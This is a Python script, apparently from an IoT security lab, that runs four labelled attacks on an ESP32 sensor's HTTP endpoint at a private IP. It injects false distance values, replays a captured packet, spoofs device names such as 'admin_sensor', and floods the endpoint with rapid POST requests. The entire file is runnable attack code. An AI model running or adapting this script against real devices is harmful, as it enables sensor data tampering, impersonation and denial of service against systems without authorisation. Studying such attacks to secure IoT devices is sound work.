import requests, time, random

TARGET = "http://172.20.10.5/data"  # hits ESP32 port 80 directly

def false_data():
    print("\n[ATTACK 2] FALSE DATA INJECTION")
    for v in [-99, -1, 9999, 5000, 0.0001, 450]:
        try:
            r = requests.post(TARGET,
                json={"device":"esp32","distance":v}, timeout=5)
            print(f"  Injected {v} cm → {r.status_code}")
        except Exception as e:
            print(f"  Failed: {e}")
        time.sleep(0.5)

def replay():
    print("\n[ATTACK 3] REPLAY ATTACK")
    pkt = {"device":"esp32","distance":24.5}
    for i in range(20):
        try:
            r = requests.post(TARGET, json=pkt, timeout=5)
            print(f"  Replay {i+1} → {r.status_code}")
        except Exception as e:
            print(f"  Failed: {e}")
        time.sleep(0.2)

def spoof():
    print("\n[ATTACK 4] SPOOFING")
    for dev in ["esp32_trusted", "admin_sensor", "sensor_01"]:
        for _ in range(5):
            try:
                r = requests.post(TARGET,
                    json={"device":dev,
                          "distance":round(random.uniform(5,30),1)},
                    timeout=5)
                print(f"  Spoof as '{dev}' → {r.status_code}")
            except Exception as e:
                print(f"  Failed: {e}")
            time.sleep(0.3)

def flood():
    print("\n[ATTACK 1] FLOOD ATTACK")
    for i in range(100):
        try:
            r = requests.post(TARGET,
                json={"device":"esp32",
                      "distance":round(random.uniform(10,50),1)},
                timeout=5)
            print(f"  Flood {i+1} → {r.status_code}")
        except Exception as e:
            print(f"  Failed: {e}")
        time.sleep(0.05)

if __name__ == "__main__":
    print("Starting all 4 attacks on ESP32...")
    print(f"Target: {TARGET}\n")
    false_data(); time.sleep(2)
    replay();     time.sleep(2)
    spoof();      time.sleep(2)
    flood()
    print("\nAll attacks complete.")